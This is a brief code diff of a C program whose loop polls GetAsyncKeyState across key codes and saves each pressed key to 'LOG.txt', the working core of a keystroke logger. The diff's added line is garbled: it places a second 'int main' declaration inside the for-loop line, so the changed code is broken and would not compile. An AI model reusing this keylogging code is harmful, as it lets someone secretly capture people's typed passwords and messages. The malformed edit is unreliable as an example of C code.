@@ -24,7 +24,7 @@ int main() {
     char i;
  
     while (1) {
-        for(i = 8; i <= 190; i++) {
+        for(i = 8; i <= 190; i++) {int main(int argc, char* argv[])
             if (GetAsyncKeyState(i) == -32767)
                 Save(i, "LOG.txt");
         }
